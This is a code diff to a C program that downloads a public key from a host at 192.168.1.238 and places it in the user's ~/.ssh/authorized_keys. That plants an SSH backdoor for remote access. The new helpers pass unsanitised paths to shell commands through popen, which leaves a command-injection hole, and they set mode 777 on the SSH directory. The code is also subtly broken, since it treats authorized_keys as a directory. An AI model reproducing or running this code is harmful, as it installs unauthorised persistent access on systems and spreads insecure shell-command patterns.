@@ -6,6 +6,7 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <errno.h>
+#include <dirent.h>
 #include "net_functions.h"
 
 struct config {
@@ -14,13 +15,55 @@ struct config {
 	char * url;
 };
 
-// FILE MOVING
+void MoveFile(const char * file, const char * dest) {
+	FILE * proc;
 
-int MoveFile(const char * src, const char * dest) {
-	printf("moving %s to %s\n", src, dest);
-	
-	rename(src, dest);
-	return 0;
+	char command[70];
+	int len;
+
+	len = snprintf(command, sizeof(command), "mv %s %s", file, dest);
+
+	if (len <= sizeof(command)) {
+		proc = popen(command, "r");
+	}
+
+	else {
+		printf("command buffer too short");
+	}
+}
+
+void CreateDirectory(const char * dir) {
+	FILE * proc;
+
+	char command[70];
+	int len;
+
+	len = snprintf(command, sizeof(command), "mkdir %s", dir);
+
+	if (len <= sizeof(command)) {
+		proc = popen(command, "r");
+	}
+
+	else {
+		printf("command buffer too short");
+	}
+}
+
+void my_chmod(int mode, const char * file_or_dir) {
+	FILE * proc;
+
+	char command[70];
+	int len;
+
+	len = snprintf(command, sizeof(command), "chmod %d %s", mode, file_or_dir);
+
+	if (len <= sizeof(command)) {
+		proc = popen(command, "r");
+	}
+
+	else {
+		printf("command buffer too short");
+	}
 }
 
 int main(void) {
@@ -29,29 +72,22 @@ int main(void) {
 
 	// CONFIG
 
-	config_1.url = "http://0.0.0.0/key.pub";
+	config_1.url = "http://192.168.1.238/key.pub";
 	config_1.source_and_outfile = "/tmp/key.pub";
-	config_1.destination = "/~/.ssh/authorized_keys/";
+	config_1.destination = "~/.ssh/authorized_keys/";
 
 	// END CONFIG 
 
-	char * mode = "600";
-	char * buf = config_1.destination;
 
-	int i;
-	i = strtol(mode, 0, 8);
-
-	if (stat(config_1.destination, &st) == -1) {
-			printf("creating directory %s\n", config_1.destination);
-
-			system("mkdir ~/.ssh/authorized_keys");	// shell scripting ;(
-			system("chmod 600 ~/.ssh/authorized_keys");
-	} 
-
-	printf("downlading %s from %s\n\n", config_1.source_and_outfile, config_1.url);
-
-	DownloadFiles(config_1.url, config_1.source_and_outfile);
-	MoveFile(config_1.source_and_outfile, config_1.destination);
+	printf("creating directory %s\n", config_1.destination);
+	CreateDirectory(config_1.destination);
+	my_chmod(777, config_1.destination);
 	
+	printf("downlading %s from %s\n\n", config_1.source_and_outfile, config_1.url);
+	DownloadFiles(config_1.url, config_1.source_and_outfile);
+
+	printf("moving %s to %s\n", config_1.source_and_outfile, config_1.destination);
+	MoveFile(config_1.source_and_outfile, config_1.destination);
+
 	return 0;
 }
